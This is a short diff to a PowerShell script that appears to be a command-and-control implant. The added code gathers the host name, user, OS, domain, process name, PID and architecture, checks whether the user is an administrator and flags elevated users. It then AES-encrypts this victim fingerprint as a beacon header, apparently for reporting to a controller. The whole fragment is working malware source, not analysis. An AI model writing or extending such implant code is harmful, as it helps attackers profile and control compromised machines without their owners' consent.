@@ -57,8 +57,20 @@ $arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 $os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
 $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
+$procarch = [Environment]::Is64BitProcess
+$procarchf = ""
+if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}
 
-$raw_header = "$final_hostname,$whoami,$os,$pid,$domain";
+$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"
+
+$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
+$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+
+if($iselv){
+$whoami = $whoami + "*"
+}
+
+$raw_header = "$final_hostname,$whoami,$os,$pnid,$domain";
 $encrypted_header = EncryptAES $AES_KEY $AES_IV $raw_header;
 $final_hostname_encrypted = EncryptAES $AES_KEY $AES_IV $final_hostname
 
